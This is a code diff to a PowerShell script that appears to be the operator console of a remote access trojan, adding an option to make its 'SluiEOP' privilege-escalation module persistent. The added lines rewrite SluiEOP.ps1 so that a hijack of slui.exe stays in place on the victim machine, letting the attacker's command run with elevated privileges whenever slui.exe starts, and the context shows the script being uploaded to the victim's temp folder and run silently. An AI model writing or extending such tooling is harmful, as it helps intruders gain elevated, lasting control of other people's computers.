@@ -933,10 +933,28 @@ While($Client.Connected)
            {
               write-host " - Input Command: " -NoNewline;
               $mYcOMMAND = Read-Host
+              ## Make the command persistence
+              write-host " - MakeItPersistence (True/False): " -NoNewline;
+              $PersisteMe = Read-Host
+              If(-not($PersisteMe) -or $PersisteMe -eq $null){$PersisteMe = "False"}
+              If($PersisteMe -eq "True"){
+                 cd mimiRatz
+                 $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
+                 If($CheckValue -match 'False'){
+                    ((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"False`"","MakeItPersistence = `"True`"")|Set-Content -Path SluiEOP.ps1 -Force
+                 }
+                 cd ..
+              }
               write-host "`n   EOP Module Remark" -ForegroundColor Yellow;
               write-host "   -----------------";
               write-host "   This module uploads SluiEOP.ps1 script to `$env:TMP dir and executes";
               write-host "   EOP to be abble to silent execute our command with higth privileges.";
+              If($PersisteMe -eq "True"){
+                 write-host "`n   If 'MakeItPersistence' its activated (True) then SluiEOP will NOT";
+                 write-host "   Delete the EOP, making the 'command' available everytime we execute";
+                 write-host "   powershell Start-Process `"C:\Windows\System32\slui.exe`" -verb runas`n"
+              }
+
               If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "$env:WINDIR\System32\cmd.exe"}
               ## Write Local script (SluiEOP.ps1.ps1) to Remote-Host $env:tmp
               $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
@@ -2019,6 +2037,12 @@ While($Client.Connected)
             Write-Host "  $OutPut";
             $Cam_set = "False";
           }ElseIf($SluiEOP -eq "True"){
+          
+            cd mimiRatz
+            $CheckValue = Get-Content SluiEOP.ps1|Select-String "MakeItPersistence ="
+            If($CheckValue -match 'True'){((Get-Content -Path SluiEOP.ps1 -Raw) -Replace "MakeItPersistence = `"True`"","MakeItPersistence = `"False`"")|Set-Content -Path SluiEOP.ps1 -Force}
+            cd ..
+
             Write-Host "`n   Privs   Status   Description" -ForeGroundColor green;
             Write-Host "   -----   ------   -----------";
             Write-Host "   user    saved    $OutPut"
